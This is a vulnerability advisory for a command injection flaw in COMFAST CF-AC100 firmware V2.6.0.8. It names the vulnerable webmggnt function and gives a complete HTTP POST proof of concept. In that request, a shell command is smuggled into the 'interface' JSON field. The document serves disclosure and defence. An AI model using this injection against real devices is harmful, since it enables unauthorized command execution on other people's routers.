## Comfast CF-AC100

- **Supplier:** COMFAST

- **Product:** CF-AC100

- **Firmware Version:** V2.6.0.8

- **Vulnerability:** Command Injection

### Overview

A command injection vulnerability has been discovered in COMFAST CF-AC100 V2.6.0.8. Attackers can exploit this vulnerability to execute arbitrary commands by sending malicious HTTP POST packets. The vulnerability is triggered when the request path is `/cgi-bin/mbox-config?method=SET&section=update_interface_png`, prompting the user to log in and obtain cookies.

### Vulnerability Details

![](../main/images/2026-02-23-17-17-39-b100ced0-ae76-419f-9430-a3312246f82e.png)

The trigger point is located in the `sub_41F1C8` method of the `webmggnt` component. Here, the `interface` and `display_name` fields are not validated before being concatenated using `sprintf` and executed using `system`.

### poc

```http
POST /cgi-bin/mbox-config?method=SET&section=update_interface_png HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0

Accept: application/json, text/javascript, */*; q=0.01

Accept-Language: en-US,en;q=0.9

Accept-Encoding: gzip, deflate, br

Content-Type: appliation/json

X-Requested-With: XMLHttpRequest

Content-Length: 73

Origin: http://192.168.0.1

Connection: close

Referer: http://192.168.0.1/index.html

Cookie: language=sc; COMFAST_SESSIONID=0200a8c0-4261ffffffc85cffffff8a5f-6b8b4567





{"interface":"; echo test > /tmp/test.txt #","display_name":"1111"}
```

![](../main/images/2026-02-23-18-23-16-76c2549c-d00d-4c8e-8892-0c115debe5d5.png)

